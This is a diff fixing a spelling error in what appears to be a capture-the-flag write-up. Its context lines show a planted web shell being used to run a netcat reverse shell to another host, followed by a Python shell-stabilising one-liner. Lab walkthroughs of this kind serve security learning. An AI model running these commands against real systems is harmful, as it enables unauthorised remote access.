@@ -31,7 +31,7 @@ Time to run our shell.php :)
 http://10.10.103.145/shell.php?cmd=nc 10.10.146.116 667 -e /bin/sh
 ```
 
-Once we are succesfully connected we can stabilize the shell and view the first flag:
+Once we are successfully connected we can stabilize the shell and view the first flag:
 
 ``` sh
 python3 -c 'import pty;pty.spawn("/bin/bash")'
